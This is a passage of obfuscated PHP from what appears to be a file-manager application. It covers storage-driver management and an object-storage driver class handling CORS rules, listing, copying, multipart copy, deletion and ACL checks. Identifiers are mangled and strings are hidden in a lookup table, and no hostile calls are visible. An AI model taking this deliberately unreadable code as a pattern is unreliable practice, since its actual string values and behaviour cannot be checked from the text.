strtolower($â–‹ä¡È[$°•×ƒìà[95]]); $ú…ÊØ„˜ = json_decode($â–‹ä¡È[$°•×ƒìà[6]], !0); foreach ($ú…ÊØ„˜ as $¾ø •“± => $Åö¦”‰Á) { $ú…ÊØ„˜[$¾ø •“±] = trim($Åö¦”‰Á); } $ú…ÊØ„˜[$°•×ƒìà[2154]] = rand_string(6); $ÃˆÙĞ×ş = $GLOBALS[$°•×ƒìà[6]][$°•×ƒìà[89]][$°•×ƒìà[833]]; $Æ“ÂŠ±¿ = isset($ÃˆÙĞ×ş[$ ú—–ª¾]) ? $ÃˆÙĞ×ş[$ ú—–ª¾] : ucfirst($ ú—–ª¾); $Û‹ÅÛÓ£ = $°•×ƒìà[74] . $Æ“ÂŠ±¿; if (!$Æ“ÂŠ±¿ || !class_exists($Û‹ÅÛÓ£)) { if ($È©ìÌ°í) { return LNG($°•×ƒìà[2155]); } write_log(array($°•×ƒìà[2156], $â–‹ä¡È, get_caller_info()), $°•×ƒìà[2157]); show_json(LNG($°•×ƒìà[2155]), !1, $â–‹ä¡È); } $‰—¶‡Úµ = new $Û‹ÅÛÓ£($ú…ÊØ„˜); if (in_array($ ú—–ª¾, $‰—¶‡Úµ->objectDriver)) { if (!$‰—¶‡Úµ->isBucketCors() && !$‰—¶‡Úµ->setBucketCors()) { $ÜÌõõğ„ = LNG($°•×ƒìà[2158]); $ÜÌõõğ„ .= $°•×ƒìà[2159] . LNG($°•×ƒìà[2160]); if ($È©ìÌ°í) { return $ÜÌõõğ„; } show_json($ÜÌõõğ„, !1); } } $‰ÖÁòãÙ = rtrim($ú…ÊØ„˜[$°•×ƒìà[1188]], $°•×ƒìà[8]) . $°•×ƒìà[8]; $ñù‚Ö¬ = $‰—¶‡Úµ->getPath($‰ÖÁòãÙ . $°•×ƒìà[1250]); if (!$‰—¶‡Úµ->mkfile($ñù‚Ö¬)) { if ($È©ìÌ°í) { return LNG($°•×ƒìà[2158]); } show_json(LNG($°•×ƒìà[2158]), !1); } $ú…ÊØ„˜[$°•×ƒìà[1188]] = $‰ÖÁòãÙ; $â–‹ä¡È[$°•×ƒìà[6]] = json_encode($ú…ÊØ„˜); $â–‹ä¡È[$°•×ƒìà[95]] = $Æ“ÂŠ±¿; return !0; } public function driverListSystem() { $ğûıÒ =& $_SERVER[ñˆ‹ß¿÷]; $íÇ“¶‰ø = parent::listData(); $õˆëÄ‚ô = array(); foreach ($íÇ“¶‰ø as $¹ğ†§¥ó) { unset($¹ğ†§¥ó[$ğûıÒ[200]], $¹ğ†§¥ó[$ğûıÒ[85]]); $¹ğ†§¥ó[$ğûıÒ[6]] = json_decode($¹ğ†§¥ó[$ğûıÒ[6]], !0); $õˆëÄ‚ô[] = $¹ğ†§¥ó; } return $õˆëÄ‚ô; } public function defaultDriver() { $È›á¨¬ =& $_SERVER[ñˆ‹ß¿÷]; $±Íâ¯Ù¢ = parent::listData(); $Ã¢¢‹ ¨ = array_filter_by_field($±Íâ¯Ù¢, $È›á¨¬[37], 1); $Ã¢¢‹ ¨ = $Ã¢¢‹ ¨[0]; if ($Ã¢¢‹ ¨) { $Ã¢¢‹ ¨[$È›á¨¬[6]] = json_decode($Ã¢¢‹ ¨[$È›á¨¬[6]], !0); } return $Ã¢¢‹ ¨; } public function driverInfo($¯Ì¢×“) { $¸ûšÆ÷± =& $_SERVER[ñˆ‹ß¿÷]; $¬Ü‘…ş¦ = array_to_keyvalue(parent::listData(), $¸ûšÆ÷±[399]); if (!isset($¬Ü‘…ş¦[$¯Ì¢×“])) { return !1; } $ŠÒé÷øÎ = $¬Ü‘…ş¦[$¯Ì¢×“]; $ŠÒé÷øÎ[$¸ûšÆ÷±[6]] = json_decode($ŠÒé÷øÎ[$¸ûšÆ÷±[6]], !0); return $ŠÒé÷øÎ; } public function remove($éÌùıÃê) { $this->removeShareItems($éÌùıÃê); return parent::remove($éÌùıÃê); } public function removeWithFile($¹ª¢ÇÁæ, $ÙŠ°¹¥) { $éØŞ¸è =& $_SERVER[ñˆ‹ß¿÷]; $ç†İÉÀ = array($éØŞ¸è[824] => $¹ª¢ÇÁæ); $Öû–½ = Model($éØŞ¸è[471])->where($ç†İÉÀ)->count(); $ğí“Èû¾ = Model($éØŞ¸è[471])->where($ç†İÉÀ)->sum($éØŞ¸è[76]); $È¨Î¡ÜØ = $ÙŠ°¹¥ . $éØŞ¸è[2161] . $¹ª¢ÇÁæ; $İîşŞíš = LNG($ÙŠ°¹¥ == $éØŞ¸è[557] ? $éØŞ¸è[2162] : $éØŞ¸è[2163]); $âÍ«óÂ§ = new TaskFileTransfer($È¨Î¡ÜØ, $éØŞ¸è[2157], $Öû–½, $İîşŞíš . "\x28{$¹ª¢ÇÁæ}\51"); $âÍ«óÂ§->task[$éØŞ¸è[770]] = (double) $ğí“Èû¾; $“íš¾ğ› = KodIO::defaultDriver(); $é­¡Ë = $“íš¾ğ›[$éØŞ¸è[399]]; $›êÙ—· = "\x7b\151\157\x3a{$é­¡Ë}\175\x2f"; $êîõóÄˆ = !0; $‰à©İ¬û = array(); $×­ı¿÷ú = Model($éØŞ¸è[199])->where($ç†İÉÀ)->field($éØŞ¸è[2164])->select(); foreach ($×­ı¿÷ú as $ù·…Ø®„) { $’ü°ó“ï = $ù·…Ø®„[$éØŞ¸è[84]]; $Öí“Ç§ó = $›êÙ—· . str_replace("\173\151\157\72{$¹ª¢ÇÁæ}\x7d\x2f", $éØŞ¸è[12], $’ü°ó“ï); if (!IO::exist($’ü°ó“ï)) { $‰à©İ¬û[] = $ù·…Ø®„[$éØŞ¸è[468]]; $âÍ«óÂ§->updateFileEnd($ù·…Ø®„[$éØŞ¸è[32]], $ù·…Ø®„[$éØŞ¸è[76]]); continue; } if (IO::exist($Öí“Ç§ó)) { $âÍ«óÂ§->updateFileEnd($ù·…Ø®„[$éØŞ¸è[32]], $ù·…Ø®„[$éØŞ¸è[76]]); continue; } if (!IO::move($’ü°ó“ï, get_path_father($Öí“Ç§ó))) { $êîõóÄˆ = !1; break; } $ç†İÉÀ = array($éØŞ¸è[468] => $ù·…Ø®„[$éØŞ¸è[468]]); $¡Öİ“õé = array($éØŞ¸è[824] => $é­¡Ë, $éØŞ¸è[84] => $Öí“Ç§ó); Model($éØŞ¸è[199])->where($ç†İÉÀ)->save($¡Öİ“õé); } $this->removeByFileID($‰à©İ¬û); if (!$êîõóÄˆ) { $âÍ«óÂ§->stop($È¨Î¡ÜØ); return !1; } $âÍ«óÂ§->end(); if ($ÙŠ°¹¥ == $éØŞ¸è[1805]) { $this->remove($¹ª¢ÇÁæ); } } public function progress($“àã¾ï£, $Ñ„ÄçÄ“) { return Task::get($Ñ„ÄçÄ“ . $_SERVER[ñˆ‹ß¿÷][2161] . $“àã¾ï£); } private function removeByFileID($ÀØØ­¯ì = array()) { $ÊÑÔôÙ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($ÀØØ­¯ì)) { return; } $õ‡¢ğã¬ = array($ÊÑÔôÙ[468] => array($ÊÑÔôÙ[7], $ÀØØ­¯ì)); $ï’Ì¬‚• = Model($ÊÑÔôÙ[1334])->where($õ‡¢ğã¬)->field($ÊÑÔôÙ[402])->select(); if (!$ï’Ì¬‚•) { return; } $ï’Ì¬‚• = array_to_keyvalue($ï’Ì¬‚•, $ÊÑÔôÙ[12], $ÊÑÔôÙ[402]); foreach ($ï’Ì¬‚• as $Ú×—¢ÕÌ) { Model($ÊÑÔôÙ[416])->removeNow($Ú×—¢ÕÌ, !1); } } private function removeShareItems($ÃƒïûÄ) { $É¡ØÛŠ÷ =& $_SERVER[ñˆ‹ß¿÷]; $áÊœ–ş = "\x7b\x69\157\72{$ÃƒïûÄ}\175\57"; $¡…½¥Õ‘ = array($É¡ØÛŠ÷[402] => 0, $É¡ØÛŠ÷[1183] => array($É¡ØÛŠ÷[383], "{$áÊœ–ş}\x25")); $·ëé‚™Ş = Model($É¡ØÛŠ÷[1816])->where($¡…½¥Õ‘)->field($É¡ØÛŠ÷[489])->select(); if (empty($·ëé‚™Ş)) { return; } $ÎŒš§ = array_to_keyvalue($·ëé‚™Ş, $É¡ØÛŠ÷[12], $É¡ØÛŠ÷[489]); Model($É¡ØÛŠ÷[601])->remove($ÎŒš§); } } goto FÙ¨Ã“òÍä; D³ËÎáã±¤: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($õ€ˆ™€ş) { parent::__construct(); include_once SDK_DIR . $_SERVER[ñˆ‹ß¿÷][1391]; $this->_init($õ€ˆ™€ş); } public function _init($äşú–÷) { $ı¬úÚÃÌ =& $_SERVER[ñˆ‹ß¿÷]; foreach ($äşú–÷ as $ù‘€Èåè => $›É¯Ï·) { if (isset($this->{$ù‘€Èåè})) { $this->{$ù‘€Èåè} = $›É¯Ï·; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ı¬úÚÃÌ[1392] . LNG($ı¬úÚÃÌ[1393])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $™æÌÛò =& $_SERVER[ñˆ‹ß¿÷]; $Ã ù˜”é = new OSS\Model\CorsConfig(); $İÏ„®©Ô = new OSS\Model\CorsRule(); $İÏ„®©Ô->addAllowedOrigin($™æÌÛò[1394]); $İÏ„®©Ô->addAllowedMethod($™æÌÛò[1395]); $İÏ„®©Ô->addAllowedMethod($™æÌÛò[1396]); $İÏ„®©Ô->addAllowedMethod($™æÌÛò[1397]); $İÏ„®©Ô->addAllowedMethod($™æÌÛò[1398]); $İÏ„®©Ô->addAllowedMethod($™æÌÛò[160]); $İÏ„®©Ô->setMaxAgeSeconds(600); $İÏ„®©Ô->addExposeHeader($™æÌÛò[1399]); $İÏ„®©Ô->addAllowedHeader($™æÌÛò[1394]); $Ã ù˜”é->addRule($İÏ„®©Ô); try { $this->client->putBucketCors($this->bucket, $Ã ù˜”é); } catch (OSS\Core\OssException $Ó¡ĞÔá) { return !1; } return !0; } public function getBucketCors() { $¯æÔí =& $_SERVER[ñˆ‹ß¿÷]; $¬í¯ß…² = null; try { $¬í¯ß…² = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ùÅ‡»•–) { return null; } if (!$¬í¯ß…² || !($Úû¶·Âë = $¬í¯ß…²->getRules())) { return null; } $ÊÃ’¶ıÀ = $Úû¶·Âë[0]->getAllowedOrigins(); $ôªÂ°Á = $Úû¶·Âë[0]->getAllowedMethods(); $Şçà‹ ¥ = $Úû¶·Âë[0]->getMaxAgeSeconds(); $úğá’õ = $Úû¶·Âë[0]->getExposeHeaders(); $ˆñò¢´ê = $Úû¶·Âë[0]->getAllowedHeaders(); return array($¯æÔí[187] => isset($ÊÃ’¶ıÀ[0]) ? $ÊÃ’¶ıÀ[0] : $¯æÔí[12], $¯æÔí[191] => $ôªÂ°Á, $¯æÔí[1400] => $Şçà‹ ¥, $¯æÔí[1401] => isset($úğá’õ[0]) ? $úğá’õ[0] : $¯æÔí[12], $¯æÔí[189] => isset($ˆñò¢´ê[0]) ? $ˆñò¢´ê[0] : $¯æÔí[12]); } public function isBucketCors() { $©£Ö«–å =& $_SERVER[ñˆ‹ß¿÷]; $é¬ŒŞØ„ = $this->getBucketCors(); if (!$é¬ŒŞØ„ || !is_array($é¬ŒŞØ„)) { return !1; } if ($é¬ŒŞØ„[$©£Ö«–å[187]] != $©£Ö«–å[188] || $é¬ŒŞØ„[$©£Ö«–å[189]] != $©£Ö«–å[188]) { return !1; } $ì“úşÌæ = array_map($©£Ö«–å[190], $é¬ŒŞØ„[$©£Ö«–å[191]]); if (!is_array($ì“úşÌæ)) { $ì“úşÌæ = array(); } $ò¡ö€õ  = array($©£Ö«–å[192], $©£Ö«–å[193], $©£Ö«–å[194], $©£Ö«–å[195], $©£Ö«–å[196]); $±šŠ½¶ = array_diff($ò¡ö€õ , $ì“úşÌæ); return empty($±šŠ½¶); } public function mkfile($ŒÃ“ÕĞË, $ÁÌ¢Ó–Ë = '', $şÕı‡£² = REPEAT_RENAME) { $‰¢øù¨¬ = $this->setContent($ŒÃ“ÕĞË, $ÁÌ¢Ó–Ë); if ($‰¢øù¨¬ !== !1) { return $this->getPathOuter($ŒÃ“ÕĞË); } return !1; } public function mkdir($ÅË¼™Äá, $Ô°†æ° = REPEAT_SKIP) { if ($Ô°†æ° && $this->_isFolder($ÅË¼™Äá)) { return $this->getPathOuter($ÅË¼™Äá); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÅË¼™Äá)); } catch (OSS\Core\OssException $»€ë¦ÖŞ) { return !1; } return $this->getPathOuter($ÅË¼™Äá); } private function fileList($šÃİÊ©Ô, $Ş¿‚Ì£ = '', $õÁ·ËØ = 0) { $‘ŞË¶á¾ =& $_SERVER[ñˆ‹ß¿÷]; $šÃİÊ©Ô = trim($šÃİÊ©Ô, $‘ŞË¶á¾[8]); $ï¯ƒÊ“Á = empty($šÃİÊ©Ô) && $šÃİÊ©Ô !== $‘ŞË¶á¾[197] ? $‘ŞË¶á¾[12] : $šÃİÊ©Ô . $‘ŞË¶á¾[8]; $ÉªóÉÖó = $‘ŞË¶á¾[12]; $³å¬™©ä = 1000; $¬É¼¹ø = $æ Ğôãº = array(); while (!0) { check_abort(); $áÍÂú™– = array($‘ŞË¶á¾[1402] => $Ş¿‚Ì£, $‘ŞË¶á¾[1403] => $ï¯ƒÊ“Á, $‘ŞË¶á¾[1404] => $³å¬™©ä, $‘ŞË¶á¾[1405] => $ÉªóÉÖó); try { $½©Û’å¶ = $this->client->listObjects($this->bucket, $áÍÂú™–); } catch (OSS\Core\OssException $İôÑùË) { break; } $ÉªóÉÖó = $½©Û’å¶->getNextMarker(); $á§ï£°Ã = $½©Û’å¶->getObjectList(); $›àì‡ş¦ = $½©Û’å¶->getPrefixList(); foreach ($á§ï£°Ã as $ñİ½ùèè) { if ($ñİ½ùèè->getKey() == $ï¯ƒÊ“Á) { continue; } $æø¢êâ = $ñİ½ùèè->getKey(); $ãµõ ñ = $ñİ½ùèè->getSize(); $ÑÁ’º• = $ñİ½ùèè->getLastModified(); $…ï‚±¦ = $õÁ·ËØ ? array($‘ŞË¶á¾[32] => $æø¢êâ, $‘ŞË¶á¾[76] => $ãµõ ñ, $‘ŞË¶á¾[203] => strtotime($ÑÁ’º•)) : $æø¢êâ; $”òóÀ‚ = $ãµõ ñ == 0 && substr($æø¢êâ, strlen($æø¢êâ) - 1, 1) == $‘ŞË¶á¾[8] ? !0 : !1; $»îí¿ğ¿ = array($‘ŞË¶á¾[76] => $ãµõ ñ, $‘ŞË¶á¾[1406] => $ãµõ ñ, $‘ŞË¶á¾[85] => strtotime($ÑÁ’º•), $‘ŞË¶á¾[1407] => $ÑÁ’º•); $this->cacheMethodInfoSet($æø¢êâ, $”òóÀ‚, $»îí¿ğ¿); if ($”òóÀ‚) { $¬É¼¹ø[] = $æø¢êâ; continue; } $æ Ğôãº[] = $…ï‚±¦; } foreach ($›àì‡ş¦ as $Ä¾øÈ°) { $¬É¼¹ø[] = $Ä¾øÈ°->getPrefix(); $this->cacheMethodInfoSet($Ä¾øÈ°->getPrefix(), !0); } if ($ÉªóÉÖó === $‘ŞË¶á¾[12]) { break; } } $this->cacheMethodInfoSet($šÃİÊ©Ô, !0); return array($‘ŞË¶á¾[82] => $¬É¼¹ø, $‘ŞË¶á¾[83] => $æ Ğôãº); } public function copyFile($Â£ü¿ÜÕ, $¹…«ÑØç) { $ÑÒ†¶œ = $this->size($Â£ü¿ÜÕ); if ($ÑÒ†¶œ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Â£ü¿ÜÕ, $this->bucket, $this->pathEncode($¹…«ÑØç)); } catch (OSS\Core\OssException $¸•õ«Æ) { return !1; } return $this->getPathOuter($¹…«ÑØç); } $®Ôˆ‹ÃÆ = $this->multiCopyObject($Â£ü¿ÜÕ, $¹…«ÑØç, $ÑÒ†¶œ); return $®Ôˆ‹ÃÆ ? $this->getPathOuter($¹…«ÑØç) : !1; } private function multiCopyObject($Î„ ‹ô•, $¹Í—˜–, $„¯åİ¿·) { $„šÄ‚èÈ =& $_SERVER[ñˆ‹ß¿÷]; try { $®ãòÑ˜• = array(); if ($Ë¯ÃÓ  = $this->hashMd5($Î„ ‹ô•)) { $®ãòÑ˜• = array(OSS\OssClient::OSS_HEADERS => array($„šÄ‚èÈ[1408] => $Ë¯ÃÓ )); } $è¡Š©ÊÎ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¹Í—˜–), $®ãòÑ˜•); $×î¿²ø› = 1; $ªÜ§’¢… = 0; $Éë§ºÎ = array(); $‰—šÜĞ” = 1024 * 1024 * 10; $®ÁÛè = $this->client->generateMultiuploadParts($„¯åİ¿·, $‰—šÜĞ”); foreach ($®ÁÛè as $¼Ú€ÖÖä => $¤´ÆàšÊ) { $ãşÎ÷¦ = $ªÜ§’¢… + (int) $¤´ÆàšÊ[$„šÄ‚èÈ[1409]]; $Õü¥Š› = (int) $¤´ÆàšÊ[$„šÄ‚èÈ[337]] + $ãşÎ÷¦ - 1; $¹ğï¾°ô = array($„šÄ‚èÈ[1410] => $ãşÎ÷¦, $„šÄ‚èÈ[1411] => $Õü¥Š›); $Éë§ºÎ[] = $this->client->uploadPartCopy($this->bucket, $Î„ ‹ô•, $this->bucket, $this->pathEncode($¹Í—˜–), $×î¿²ø›, $è¡Š©ÊÎ, $¹ğï¾°ô); $×î¿²ø› = $×î¿²ø› + 1; } $¶ÑÑŞÅ = array(); foreach ($Éë§ºÎ as $¼Ú€ÖÖä => $Â¾ÈğÁ¼) { $¶ÑÑŞÅ[] = array($„šÄ‚èÈ[1412] => $¼Ú€ÖÖä + 1, $„šÄ‚èÈ[1413] => $Â¾ÈğÁ¼); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($¹Í—˜–), $è¡Š©ÊÎ, $¶ÑÑŞÅ); } catch (OSS\Core\OssException $Ïû‚²õø) { return !1; } return !0; } public function moveFile($¸À¸œ·Ö, $œËª±‰±) { if ($this->copyFile($¸À¸œ·Ö, $œËª±‰±)) { $this->remove($¸À¸œ·Ö); return $this->getPathOuter($œËª±‰±); } return !1; } public function delFile($©¤âÒûş) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($©¤âÒûş)); } catch (OSS\Core\OssException $Ï¯®ËĞ€) { return !1; } return !0; } public function delFolder($•‘Ğè¯ë) { $×œõ‚ê =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->exist($•‘Ğè¯ë)) { return !0; } $this->listItemCache = !1; $£ÇÎ¸ËŞ = $this->fileList($•‘Ğè¯ë); $this->listItemCache = !0; $³ğŞãµÓ = trim($•‘Ğè¯ë, $×œõ‚ê[8]) . $×œõ‚ê[8]; if (!empty($•‘Ğè¯ë) && $•‘Ğè¯ë !== $×œõ‚ê[197] && !in_array($³ğŞãµÓ, $£ÇÎ¸ËŞ[$×œõ‚ê[82]])) { $£ÇÎ¸ËŞ[$×œõ‚ê[82]][] = $³ğŞãµÓ; } $‹¥Ä¨Îâ = $this->delByBatch($£ÇÎ¸ËŞ[$×œõ‚ê[83]]); if (!$‹¥Ä¨Îâ) { return !1; } $‹¥Ä¨Îâ = $this->delByBatch($£ÇÎ¸ËŞ[$×œõ‚ê[82]]); if (!$‹¥Ä¨Îâ) { return !1; } return $this->delFile($³ğŞãµÓ); } private function delByBatch($Û¾‰êÔ) { foreach (array_chunk($Û¾‰êÔ, 1000) as $úÈáŠ°¾) { try { $this->client->deleteObjects($this->bucket, $úÈáŠ°¾); } catch (OSS\Core\OssException $¼Ş‘Áø®) { return !1; } } return !0; } public function rename($ÌşûÃ•¸, $ÑÜ÷ÓöÃ) { return $this->renameObject($ÌşûÃ•¸, $ÑÜ÷ÓöÃ); } private function fileInfo($ò¿èå ƒ, $È™Ğ±Ê° = false, $½¢¶Ôæª = array()) { $ÃŞ¡Æç– =& $_SERVER[ñˆ‹ß¿÷]; $Û§ùšì = array($ÃŞ¡Æç–[32] => $this->pathThis($ò¿èå ƒ), $ÃŞ¡Æç–[84] => $this->getPathOuter($ò¿èå ƒ), $ÃŞ¡Æç–[33] => $ÃŞ¡Æç–[199], $ÃŞ¡Æç–[76] => isset($½¢¶Ôæª[$ÃŞ¡Æç–[76]]) ? $½¢¶Ôæª[$ÃŞ¡Æç–[76]] : 0, $ÃŞ¡Æç–[174] => $this->ext($ò¿èå ƒ)); if ($È™Ğ±Ê°) { return $Û§ùšì; } $Û§ùšì[$ÃŞ¡Æç–[200]] = $Û§ùšì[$ÃŞ¡Æç–[85]] = 0; $Û§ùšì[$ÃŞ¡Æç–[201]] = $Û§ùšì[$ÃŞ¡Æç–[202]] = !0; if (empty($½¢¶Ôæª)) { $şğïÇˆÛ = $this->objectMeta($ò¿èå ƒ); if (!$şğïÇˆÛ) { return $Û§ùšì; } $½¢¶Ôæª = array($ÃŞ¡Æç–[85] => strtotime($şğïÇˆÛ[$ÃŞ¡Æç–[1407]]), $ÃŞ¡Æç–[76] => $şğïÇˆÛ[$ÃŞ¡Æç–[1406]] + 0); } if (isset($½¢¶Ôæª[$ÃŞ¡Æç–[76]])) { $Û§ùšì[$ÃŞ¡Æç–[76]] = $½¢¶Ôæª[$ÃŞ¡Æç–[76]]; } if (isset($½¢¶Ôæª[$ÃŞ¡Æç–[85]])) { $Û§ùšì[$ÃŞ¡Æç–[85]] = $½¢¶Ôæª[$ÃŞ¡Æç–[85]]; } if (isset($½¢¶Ôæª[$ÃŞ¡Æç–[203]]) && !trim($Û§ùšì[$ÃŞ¡Æç–[85]])) { $Û§ùšì[$ÃŞ¡Æç–[85]] = $½¢¶Ôæª[$ÃŞ¡Æç–[203]]; } return $Û§ùšì; } private function folderInfo($µà»÷ô‰, $íÑÂœá = false, $–ùíÓÁ¡ = array()) { $ÆçÙç‹× =& $_SERVER[ñˆ‹ß¿÷]; $ëÔšÆ = array($ÆçÙç‹×[32] => $this->pathThis($µà»÷ô‰), $ÆçÙç‹×[84] => $this->getPathOuter($ÆçÙç‹×[8] . $µà»÷ô‰), $ÆçÙç‹×[33] => $ÆçÙç‹×[75]); if ($íÑÂœá) { return $ëÔšÆ; } $ëÔšÆ[$ÆçÙç‹×[200]] = $ëÔšÆ[$ÆçÙç‹×[85]] = 0; $ëÔšÆ[$ÆçÙç‹×[201]] = $ëÔšÆ[$ÆçÙç‹×[202]] = !0; if (empty($–ùíÓÁ¡)) { $µà»÷ô‰ = rtrim($µà»÷ô‰, $ÆçÙç‹×[8]) . $ÆçÙç‹×[8]; $™’‚ò±ë = $this->objectMeta($µà»÷ô‰); if (!$™’‚ò±ë) { return $ëÔšÆ; } $–ùíÓÁ¡ = array($ÆçÙç‹×[200] => $™’‚ò±ë[$ÆçÙç‹×[511]][$ÆçÙç‹×[1414]], $ÆçÙç‹×[85] => strtotime($™’‚ò±ë[$ÆçÙç‹×[1407]])); } if (isset($–ùíÓÁ¡[$ÆçÙç‹×[85]])) { $ëÔšÆ[$ÆçÙç‹×[85]] = $–ùíÓÁ¡[$ÆçÙç‹×[85]]; } if (isset($–ùíÓÁ¡[$ÆçÙç‹×[200]])) { $ëÔšÆ[$ÆçÙç‹×[200]] = $–ùíÓÁ¡[$ÆçÙç‹×[200]]; } return $ëÔšÆ; } public function listPath($ŞøÚıâ–, $œ”õùØú = false) { $ÃâÍÅ Ò =& $_SERVER[ñˆ‹ß¿÷]; $´ğñ†Š = $this->fileList($ŞøÚıâ–, $ÃâÍÅ Ò[8], !0); foreach ($´ğñ†Š[$ÃâÍÅ Ò[82]] as $¶ºÜù => $±Àåîùº) { $´ğñ†Š[$ÃâÍÅ Ò[82]][$¶ºÜù] = $this->folderInfo($±Àåîùº, $œ”õùØú, $±Àåîùº); } foreach ($´ğñ†Š[$ÃâÍÅ Ò[83]] as $¶ºÜù => $±Àåîùº) { $´ğñ†Š[$ÃâÍÅ Ò[83]][$¶ºÜù] = $this->fileInfo($±Àåîùº[$ÃâÍÅ Ò[32]], $œ”õùØú, $±Àåîùº); } return $´ğñ†Š; } protected function infoChildren($ÙğµñæÛ, &$ìæˆ€Àş) { $»¥Ú‰†å =& $_SERVER[ñˆ‹ß¿÷]; $¶Ì†™ù¥ = $this->fileList($ÙğµñæÛ, $»¥Ú‰†å[12], !0); $ìæˆ€Àş[$»¥Ú‰†å[78]] += count($¶Ì†™ù¥[$»¥Ú‰†å[82]]); $ìæˆ€Àş[$»¥Ú‰†å[77]] += count($¶Ì†™ù¥[$»¥Ú‰†å[83]]); foreach ($¶Ì†™ù¥[$»¥Ú‰†å[83]] as $³üá“ïß) { if (!$³üá“ïß || !$³üá“ïß[$»¥Ú‰†å[76]]) { continue; } $ìæˆ€Àş[$»¥Ú‰†å[76]] += $³üá“ïß[$»¥Ú‰†å[76]]; } } public function has($Ñ‡ÍŞîÖ, $¡Ÿ½÷Ó = false, $Êï’¨­² = true) { $öÀâàĞŸ =& $_SERVER[ñˆ‹ß¿÷]; $Ñ‡ÍŞîÖ = trim($Ñ‡ÍŞîÖ, $öÀâàĞŸ[8]); $Úğûòš = empty($Ñ‡ÍŞîÖ) && $Ñ‡ÍŞîÖ !== $öÀâàĞŸ[197] ? $öÀâàĞŸ[12] : $Ñ‡ÍŞîÖ . $öÀâàĞŸ[8]; $Çü ¢ª = $öÀâàĞŸ[12]; $³Ö¹£óÒ = 500; $òŠÉÀá = $ßçª—Öğ = 0; while (!0) { check_abort(); $»®ÁËÃ‡ = array($öÀâàĞŸ[1402] => $öÀâàĞŸ[8], $öÀâàĞŸ[1403] => $Úğûòš, $öÀâàĞŸ[1404] => $³Ö¹£óÒ, $öÀâàĞŸ[1405] => $Çü ¢ª); try { $¾ØíÊÜõ = $this->client->listObjects($this->bucket, $»®ÁËÃ‡); } catch (OSS\Core\OssException $³Í·§ØÎ) { break; } $Çü ¢ª = $¾ØíÊÜõ->getNextMarker(); $ØÜÌõ = $¾ØíÊÜõ->getObjectList(); $—›ÊÃìù = $¾ØíÊÜõ->getPrefixList(); if ($¡Ÿ½÷Ó) { if (count($ØÜÌõ) > 1 || count($ØÜÌõ) == 1 && $ØÜÌõ[0]->getKey() != $Úğûòš) { $òŠÉÀá += count($ØÜÌõ) - 1; } if (!empty($—›ÊÃìù)) { $ßçª—Öğ += count($—›ÊÃìù); } if ($Çü ¢ª === $öÀâàĞŸ[12]) { break; } continue; } if ($Êï’¨­²) { if (!empty($ØÜÌõ)) { if (count($ØÜÌõ) > 1 || $ØÜÌõ[0]->getKey() != $Úğûòš) { return !0; } } } else { if (!empty($—›ÊÃìù)) { return !0; } } if ($Çü ¢ª === $öÀâàĞŸ[12]) { break; } } if ($¡Ÿ½÷Ó) { return array($öÀâàĞŸ[207] => $òŠÉÀá, $öÀâàĞŸ[208] => $ßçª—Öğ); } return !1; } public function listAll($é¸Õúß¤) { $º—À© =& $_SERVER[ñˆ‹ß¿÷]; $½·£„ Ó = $this->fileList($é¸Õúß¤, $º—À©[12], !0); $ÃñãÕŞ = array(); foreach ($½·£„ Ó[$º—À©[83]] as $‘ıÙÉŒÒ) { $ÃñãÕŞ[$‘ıÙÉŒÒ[$º—À©[32]]] = $‘ıÙÉŒÒ[$º—À©[76]]; } foreach ($½·£„ Ó[$º—À©[82]] as $‘ıÙÉŒÒ) { if (is_string($‘ıÙÉŒÒ)) { $ÃñãÕŞ[$‘ıÙÉŒÒ] = 0; } } return $this->listAllFiles($é¸Õúß¤, array_keys($ÃñãÕŞ), $ÃñãÕŞ); } public function canRead($êõ··£î) { $İŞ«ú›ş =& $_SERVER[ñˆ‹ß¿÷]; $çÜÚÁœ‚ = $this->pathAcl($êõ··£î); return $çÜÚÁœ‚ == $İŞ«ú›ş[1415] || $çÜÚÁœ‚ == $İŞ«ú›ş[556] ? !0 : !1; } public function canWrite($ùÎ–¬¿ø) { $æ‡£ÌØÖ = $this->pathAcl($ùÎ–¬¿ø); return $æ‡£ÌØÖ == $_SERVER[ñˆ‹ß¿÷][556] ? !0 : !1; } public function pathAcl($†‰¶¡¼ê) { $¬£®ï˜Â =& $_SERVER[ñˆ‹ß¿÷]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $»Şûşˆ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($†‰¶¡¼ê)); } catch (OSS\Core\OssException $Áß¹Û€ç) { return !1; } $ øØ×ÌÎ = $»Şûşˆ == $¬£®ï˜Â[37] ? $this->bucketAcl : $»Şûşˆ; if ($ øØ×ÌÎ == $¬£®ï˜Â[1416]) { return $¬£®ï˜Â[1415]; } if ($ øØ×ÌÎ == $¬£®ï˜Â[1417]) { return $¬£®ï˜Â[556]; } return $ øØ×ÌÎ; } private function chmodPath($¥¼Ù×¸Š, $šë“çî‘ = '') { $®òÙ‚È =& $_SERVER[ñˆ‹ß¿÷]; $ååÃ‡ = empty($šë“çî‘) ? $®òÙ‚È[1417] : $šë“çî‘; $ûÒÕ®†— = array($®òÙ‚È[37], $®òÙ‚È[198], $®òÙ‚È[1416], $®òÙ‚È[1417]); if (!in_array($ååÃ‡, $ûÒÕ®†—)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¥¼Ù×¸Š), $ååÃ‡); } catch (OSS\Core\OssException $ïµ¢‡Éæ) { return !1; } return !0; } public function getContent($Ê¯ûŞ) { return $this->fileSubstr($Ê¯ûŞ, -1); } public function setContent($ù„éÓ , $†÷ßƒÖ± = '') { $àÔÉÊ’º =& $_SERVER[ñˆ‹ß¿÷]; try { 